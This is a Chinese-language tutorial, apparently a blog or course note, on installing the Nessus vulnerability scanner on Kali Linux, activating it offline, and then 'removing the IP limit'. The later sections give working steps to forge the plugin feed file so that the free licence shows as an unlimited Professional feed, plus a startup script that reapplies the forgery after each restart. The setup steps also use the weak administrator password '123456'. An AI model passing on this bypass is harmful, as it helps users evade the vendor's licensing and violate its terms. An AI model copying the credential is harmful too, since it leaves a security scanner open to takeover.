        <content type="html">&lt;h1 id=&#34;nessus介绍与安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nessus介绍与安装&#34;&gt;#&lt;/a&gt; Nessus 介绍与安装&lt;/h1&gt;
&lt;h2 id=&#34;1nessus简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1nessus简介&#34;&gt;#&lt;/a&gt; 1.Nessus 简介&lt;/h2&gt;
&lt;p&gt;Nessus 号称是世界上最流行的漏洞扫描程序，全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，Nessus 可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus 也是渗透测试重要工具之一&lt;/p&gt;
&lt;h2 id=&#34;2kali安装nessus&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2kali安装nessus&#34;&gt;#&lt;/a&gt; 2.kali 安装 Nessus&lt;/h2&gt;
&lt;p&gt;1. 访问 Nessus 官网&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.tenable.com/downloads/nessus&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/1dde7c7b4ec645cba3c61b1e8a5ca73f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者下载课程资料里的安装包【Nessus-10.1.1-debian6_amd64.deb】到 kali&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/22505ff746a648c397bf5dc2cef5a7a2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 安装 Nessus 程序&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dpkg -i Nessus-10.1.1-debian6_amd64.deb &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/071d1f15c17c42f381975763adf711d0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;You can start Nessus Scanner by typing /bin/systemctl start nessusd.service 启动服务命令&lt;/p&gt;
&lt;p&gt;Then go to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9rYWxpOjg4MzQv&#34;&gt;https://kali:8834/&lt;/span&gt;to configure your scanner  访问地址&lt;/p&gt;
&lt;p&gt;3. 启动 Nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service nessusd start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4. 查看 kali 的 ip&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ip a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f892a26fccf8481fa9f5f687c26c1a58.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 浏览器访问 nessus 的 web 网站&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.11.75:8834/#/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/d7e0366737ee4e91b5e16b403792ae4b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 选择 【Managed Scanner】选项，点击【Continue】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f8c1d51f75694259b6a4cd4ce504dfea.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 选择【&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1RlbmFibGUuc2M=&#34;&gt;Tenable.sc&lt;/span&gt;】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/80ba631a892e4a089673aedb0df08804.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 点击【Continue】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/3f4f08d4a8544277ae02f174a8e62ecc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 输入用户名【admin】，输入密码【123456】，点击【Submit】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/8021cf24bd45404eaeba0b0fae793bd5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 等待配置插件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/86313f9a1137476c8a1a0d023c89069b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/565d98fe895c431eb8504e1814f9403d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;安装完成后是这样的界面，尚未激活，不能扫描，此时只有一个设置按钮，并无扫描按钮.&lt;/p&gt;
&lt;h2 id=&#34;3离线激活nessus&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3离线激活nessus&#34;&gt;#&lt;/a&gt; 3. 离线激活 Nessus&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;去 nessus 官方申请激活码，姓名随便填，邮箱必须正确，用来接收激活码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://zh-cn.tenable.com/products/nessus/nessus-essentials&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2e042a1b3bc24ebe96668f68b6ccd487.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b89303b62eee43bc99b9d7c3739212f2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 进入填写的邮箱获取激活码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b2d9202c94c4da080936d485a3c2c83.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/24bf49a1d16e4261a1d30d92ec805d5b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 获得质询码（challenge code）&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/opt/nessus/sbin/nessuscli fetch  --challenge&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/97008ee858754d229d82981cc26b7a62.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 获取离线插件包地址及激活证书&lt;/p&gt;
&lt;p&gt;浏览器打开网页 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wbHVnaW5zLm5lc3N1cy5vcmcvdjIvb2ZmbGluZS5waHA=&#34;&gt;https://plugins.nessus.org/v2/offline.php&lt;/span&gt; ，输入申请的激活码，以及上一步得到的质询码，点击【Submit】&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://plugins.nessus.org/v2/offline.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/dad3f4a3b1804e7e88742ace5246b2f2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 得到更新插件地址，及 license 证书&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/c2f6d9b61f25438c838edc005ac099cc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 下载更新包，下载证书 nessus.license。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/045c0b7dccda4006a172bbe12979e312.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9788ef99b5ce4621ae1e644285f43ed2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 将下载好的激活证书和插件包复制到 kali&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4f9d3d443be24573a4e003cdad62294d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 离线激活 nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/opt/nessus/sbin/nessuscli fetch --register-offline ./nessus.license&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4da74bfab4124d49824c08fabcfbb02f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;您的激活码已正确注册 - 谢谢。&lt;/p&gt;
&lt;p&gt;9. 安装插件包&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/opt/nessus/lib/nessus/plugins/  #插件包目录&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3602dbf8e98c41b08e2698986e81f194.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;10. 重启 nessus&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service nessusd restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2f8e50f756dd4a4797a7e0f9bc2213fa.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;11. 重新访问 nessus 网站，等待加载插件【耗时较长，需要耐心等待】&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.10.141:8834/#/settings/about&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b16c2d94b5d4440b025297ec1f9b6f5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;完成后进入 nessus 系统。显示激活成功，具有了 scan 功能。但显示仅允许扫描 16 个 IP。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b2def339468746fdbd114bed1f43d1d3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;4解除ip限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4解除ip限制&#34;&gt;#&lt;/a&gt; 4. 解除 IP 限制&lt;/h2&gt;
&lt;p&gt;1. 获取当前 plugins 的版本。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://plugins.nessus.org/v2/plugins.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3032df10296340a5bcba5e1d51445822.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 停止 nessus 服务&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service nessusd stop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3. 创建 plugin_feed_info.inc&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi plugin_feed_info.inc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;内容如下，并将刚刚获取到的版本号替换如下内容中的数字串。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PLUGIN_SET = &amp;quot;202203090609&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PLUGIN_FEED = &amp;quot;ProfessionalFeed (Direct)&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PLUGIN_FEED_TRANSPORT = &amp;quot;Tenable Network Security Lightning&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;4. 将 plugin_feed_info.inc 替换到 /opt/nessus/var/nessus/plugin_feed_info.inc&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp plugin_feed_info.inc /opt/nessus/var/nessus/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;5. 将 /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc 文件删除。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;6. 启动 nessus 服务&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service nessusd start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;7. 访问 Nessus，windows 打开浏览器，访问 nessus，会看到 nessus 初始化插件，完成后，看设置页面显示 unlimited。表示解除 IP 限制成功。&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://192.168.3.47:8834/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/be568c6057e74ea59f2f4a61bbad1fd2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;5解决nessus重启失效后遗症&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5解决nessus重启失效后遗症&#34;&gt;#&lt;/a&gt; 5. 解决 Nessus 重启失效后遗症&lt;/h2&gt;
&lt;p&gt;由于 Nessus 服务每次重启后，都会重置 plugin_feed_info.inc，这将会使 nessus/plugins 目录下所有的插件都被删除，无法扫描。因此要将 nessus 服务设置为手动，并且先停止 nessus 服务。可以写成批处理解决此问题&lt;/p&gt;
&lt;p&gt;1. 编写启动脚本&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd stop;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /root/nessus/plugin_feed_info.inc /opt/nessus/var/nessus/;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd start;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;每次需要启动 nessus 时 输入启动命令&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sh /root/nessus/qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;2.nessus 命令合集&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#启动&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd start;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#重启&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd restart;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#查看状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#停止服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service nessusd stop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3. 遇到的坑及相应的解决办法&lt;/p&gt;
&lt;p&gt;在解除 ip 限制的过程中，如果已经解除成功，但是新建扫描项目时，发现很快就结束，无扫描结果。此时查看 plugins 目录内容是否被删除。&lt;/p&gt;
